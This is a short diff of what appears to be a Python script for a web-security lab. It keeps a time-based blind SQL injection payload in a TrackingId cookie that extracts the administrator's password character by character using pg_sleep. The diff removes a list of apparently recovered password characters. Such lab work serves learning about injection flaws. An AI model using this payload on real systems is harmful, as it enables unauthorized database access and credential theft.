@@ -2,16 +2,7 @@
 
 #TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 """
-1_3
-2_l
-3_y 
-4_2
-5_p
-6_z
-7_u
-8_n
 
-14_a
 """
 
 import requests
